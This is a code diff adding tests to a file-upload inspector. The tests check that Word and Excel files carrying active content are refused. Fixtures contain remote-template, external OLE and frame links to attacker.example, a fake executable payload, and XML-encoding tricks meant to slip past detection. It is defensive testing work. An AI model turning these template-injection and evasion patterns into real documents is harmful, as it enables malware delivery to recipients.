@@ -2,7 +2,7 @@ import { createHash, randomBytes } from 'node:crypto';
 import { Readable, Writable } from 'node:stream';
 import { pipeline } from 'node:stream/promises';
 import { describe, expect, it } from 'vitest';
-import { officeFile, zipOf } from '../../test/zip.js';
+import { officeFile, relationships, zipOf } from '../../test/zip.js';
 import { FileInspection, FileRefusedError, MAX_DOCUMENT_BYTES, type RefusalReason } from './file-inspection.js';
 
 const PDF = Buffer.from('%PDF-1.7\n1 0 obj << >> endobj\ntrailer << >>\n%%EOF\n', 'ascii');
@@ -151,5 +151,110 @@ describe('file inspection', () => {
     expect((await inspect('scan.docx', large)).result.mediaType).toBe(
       'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
     );
+  });
+
+  describe('Office files that bring in active content (review D1)', () => {
+    const word = (extra: Record<string, string | Buffer>, deflate = true) => officeFile('word/document.xml', extra, { deflate });
+    const template = (target: string) => ({
+      'word/_rels/settings.xml.rels': relationships({ type: 'attachedTemplate', target, external: true }),
+    });
+
+    it.each([
+      ['a remote template over https', template('https://attacker.example/template.dotm')],
+      ['a remote template on a network share', template('\\\\attacker.example\\share\\template.dotm')],
+      ['a template from a file URL on another computer', template('file://attacker.example/share/template.dotm')],
+      ['an external OLE object', { 'word/_rels/document.xml.rels': relationships({ type: 'oleObject', target: 'https://attacker.example/x.bin', external: true }) }],
+      ['an external frame', { 'word/_rels/webSettings.xml.rels': relationships({ type: 'frame', target: 'https://attacker.example/', external: true }) }],
+      ['an embedded object', { 'word/embeddings/oleObject1.bin': Buffer.from(`MZ${'x'.repeat(200)}`) }],
+      ['an embedded macro-enabled workbook', { 'word/embeddings/Microsoft_Excel_Macro-Enabled_Worksheet.xlsm': randomBytes(100) }],
+      ['an ActiveX control', { 'word/activeX/activeX1.xml': '<x/>' }],
+    ])('refuses %s', async (_case, extra) => {
+      expect(await refusal('letter.docx', word(extra))).toBe('active_content');
+    });
+
+    it('refuses the file from the review probe: remote template and embedded program, stored uncompressed', async () => {
+      const probe = word(
+        { ...template('https://attacker.example/template.dotm'), 'word/embeddings/oleObject1.bin': Buffer.from(`MZ${'x'.repeat(200)}`) },
+        false,
+      );
+
+      expect(await refusal('letter.docx', probe)).toBe('active_content');
+    });
+
+    it('refuses macros whatever their part is called', async () => {
+      const renamed = word({
+        'word/_rels/document.xml.rels': relationships({ type: 'vbaProject', target: 'innocent.bin' }),
+        'word/innocent.bin': randomBytes(100),
+      });
+
+      expect(await refusal('letter.docx', renamed)).toBe('macros');
+    });
+
+    it.each([
+      [
+        'character references',
+        '<Relationships><Relationship Id="r1" Type="http://x/relationships/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="&#69;xternal"/></Relationships>',
+      ],
+      [
+        'a namespace prefix and single quotes',
+        "<r:Relationships xmlns:r='urn:x'><r:Relationship Id='r1' Type='http://x/relationships/attachedTemplate' Target='https://attacker.example/t.dotm' TargetMode='External'/></r:Relationships>",
+      ],
+      [
+        'a ">" inside an attribute value',
+        '<Relationships><Relationship Id="r1" Target="https://attacker.example/a>b" Type="http://x/relationships/attachedTemplate" TargetMode="External"/></Relationships>',
+      ],
+    ])('is not fooled by %s', async (_case, xml) => {
+      expect(await refusal('letter.docx', word({ 'word/_rels/settings.xml.rels': xml }))).toBe('active_content');
+    });
+
+    it('refuses UTF-16 relationships that link outside', async () => {
+      const xml = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(relationships({ type: 'attachedTemplate', target: 'https://attacker.example/t.dotm', external: true }), 'utf16le')]);
+
+      expect(await refusal('letter.docx', word({ 'word/_rels/settings.xml.rels': xml }))).toBe('active_content');
+    });
+
+    it.each([
+      ['a relationship it cannot read for certain', '<Relationships><Relationship Id=r1 Type="x" TargetMode="External"/></Relationships>'],
+      ['relationships that expand to over 1 MB', `<Relationships>${' '.repeat(2 * 1024 * 1024)}</Relationships>`],
+    ])('refuses %s', async (_case, xml) => {
+      expect(await refusal('letter.docx', word({ 'word/_rels/settings.xml.rels': xml }))).toBe('type');
+    });
+
+    it.each([
+      ['hyperlinks to websites', { 'word/_rels/document.xml.rels': relationships({ type: 'hyperlink', target: 'https://www.gov.uk/', external: true }) }],
+      ['a template on the local disk', template('file:///C:/Users/jane/AppData/Roaming/Microsoft/Templates/Normal.dotm')],
+      ['an embedded chart workbook', { 'word/embeddings/Microsoft_Excel_Worksheet.xlsx': randomBytes(100) }],
+      ['internal relationships', { 'word/_rels/document.xml.rels': relationships({ type: 'styles', target: 'styles.xml' }, { type: 'image', target: 'media/image1.png' }) }],
+    ])('accepts %s', async (_case, extra) => {
+      expect(await refusal('letter.docx', word(extra))).toBeUndefined();
+    });
+
+    it("accepts Excel's printer settings, which are binary parts too", async () => {
+      expect(await refusal('accounts.xlsx', officeFile('xl/workbook.xml', { 'xl/printerSettings/printerSettings1.bin': randomBytes(100) }, { deflate: true }))).toBeUndefined();
+    });
+
+    it('finds a relationships part however the file is cut into the pieces it arrives in', async () => {
+      const file = word({ 'word/media/image1.png': randomBytes(500), ...template('https://attacker.example/t.dotm') });
+      const header = file.indexOf('word/_rels/settings.xml.rels') - 30;
+
+      for (let cut = header - 2; cut <= header + 60; cut++) {
+        const inspection = new FileInspection('letter.docx');
+        const refused = await pipeline(
+          Readable.from([file.subarray(0, cut), file.subarray(cut)]),
+          inspection,
+          new Writable({ write: (_chunk, _encoding, done) => done() }),
+        ).then(
+          () => undefined,
+          (error: FileRefusedError) => error.reason,
+        );
+        expect(refused, `cut at ${cut}`).toBe('active_content');
+      }
+    });
+
+    it('decodes references, so an internal relationship written with them is accepted', async () => {
+      const xml = '<Relationships><Relationship Id="r1" Type="http://x/relationships/styles" Target="styles.xml" TargetMode="&#73;nternal"/></Relationships>';
+
+      expect(await refusal('letter.docx', word({ 'word/_rels/document.xml.rels': xml }))).toBeUndefined();
+    });
   });
 });
